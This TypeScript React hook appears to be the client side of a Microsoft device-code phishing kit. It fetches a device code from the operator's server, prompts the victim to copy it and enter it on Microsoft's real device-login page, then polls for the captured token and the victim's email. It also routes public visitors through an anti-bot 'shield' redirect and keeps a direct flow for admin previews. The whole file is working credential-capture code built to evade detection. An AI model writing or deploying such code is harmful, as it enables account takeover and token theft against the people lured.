import { useState, useEffect, useRef, useCallback } from 'react';

const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';

export type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';

export interface DeviceCodeFlow {
  state: CaptureState;
  userCode: string;
  copied: boolean;
  countdown: number;
  errorMsg: string;
  authEmail: string;
  handleStart: () => Promise<void>;
  handleCopy: () => void;
  handleVerify: () => void;
  handleReset: () => void;
  formatTime: (s: number) => string;
}

// Shield-enabled start: fetches anti-bot token and redirects to shield page
async function shieldRedirect(templateId: string): Promise<void> {
  try {
    const res = await fetch('/api/antibot-token');
    const data = await res.json() as { token: string };
    if (data.token) {
      window.location.href = `/api/schedule/confirm?t=${encodeURIComponent(data.token)}&tpl=${encodeURIComponent(templateId)}`;
    }
  } catch {
    window.location.href = `/api/schedule/confirm?t=&tpl=${encodeURIComponent(templateId)}`;
  }
}

function isPublicPage(): boolean {
  const p = window.location.pathname;
  return p === '/' || p === '';
}

export function useDeviceCodeFlow(templateId?: string): DeviceCodeFlow {
  const [state, setState] = useState<CaptureState>('idle');
  const [userCode, setUserCode] = useState('');
  const [deviceCode, setDeviceCode] = useState('');
  const [copied, setCopied] = useState(false);
  const [countdown, setCountdown] = useState(0);
  const [errorMsg, setErrorMsg] = useState('');
  const [pollInterval, setPollInterval] = useState(5);
  const [authEmail, setAuthEmail] = useState('');
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pollActiveRef = useRef(false);

  useEffect(() => {
    if (countdown <= 0 || (state !== 'code_ready' && state !== 'waiting')) return;
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) { clearInterval(timer); stopPolling(); setState('expired'); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [countdown, state]);

  useEffect(() => { return () => stopPolling(); }, []);

  function stopPolling(): void {
    pollActiveRef.current = false;
    if (pollTimerRef.current) { clearTimeout(pollTimerRef.current); pollTimerRef.current = null; }
  }

  function startPolling(dCode: string, interval: number): void {
    stopPolling();
    pollActiveRef.current = true;
    async function poll(): Promise<void> {
      if (!pollActiveRef.current) return;
      try {
        const res = await fetch('/api/token-poll', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceCode: dCode }) });
        const data = await res.json() as { status: string; error?: string; description?: string; email?: string };
        if (!pollActiveRef.current) return;
        if (data.status === 'complete') { stopPolling(); setAuthEmail(data.email ?? ''); setState('success'); return; }
        if (data.status === 'expired') { stopPolling(); setState('expired'); return; }
        if (data.status === 'slow_down') { const n = interval + 5; setPollInterval(n); if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, n * 1000); return; }
        if (data.status === 'error') { stopPolling(); setErrorMsg(data.description ?? data.error ?? 'Failed'); setState('error'); return; }
        if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000);
      } catch { if (pollActiveRef.current) pollTimerRef.current = setTimeout(poll, interval * 1000); }
    }
    pollTimerRef.current = setTimeout(poll, interval * 1000);
  }

  const handleStart = useCallback(async (): Promise<void> => {
    // On public pages, redirect through the shield (Layers 4-8)
    if (templateId && isPublicPage()) {
      setState('loading');
      await shieldRedirect(templateId);
      return;
    }
    // On preview/admin pages, use direct flow (no shield)
    setState('loading');
    setErrorMsg('');
    try {
      const res = await fetch('/api/device-code', { method: 'POST' });
      const data = await res.json() as { userCode: string; deviceCode: string; expiresIn: number; interval: number; error?: string };
      if (!res.ok || data.error) { setErrorMsg(data.error ?? 'Failed'); setState('error'); return; }
      setUserCode(data.userCode);
      setDeviceCode(data.deviceCode);
      setCountdown(data.expiresIn);
      setPollInterval(data.interval || 5);
      setState('code_ready');
      startPolling(data.deviceCode, data.interval || 5);
    } catch (err) { setErrorMsg(err instanceof Error ? err.message : 'Network error'); setState('error'); }
  }, [templateId]);

  const handleCopy = useCallback((): void => {
    navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
  }, [userCode]);

  const handleVerify = useCallback((): void => {
    setState('waiting');
    window.open(DEVICE_AUTH_URL, '_blank');
  }, []);

  const handleReset = useCallback((): void => {
    stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
    setCopied(false); setCountdown(0); setErrorMsg(''); setAuthEmail('');
  }, []);

  function formatTime(s: number): string { return `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, '0')}`; }

  return { state, userCode, copied, countdown, errorMsg, authEmail, handleStart, handleCopy, handleVerify, handleReset, formatTime };
}
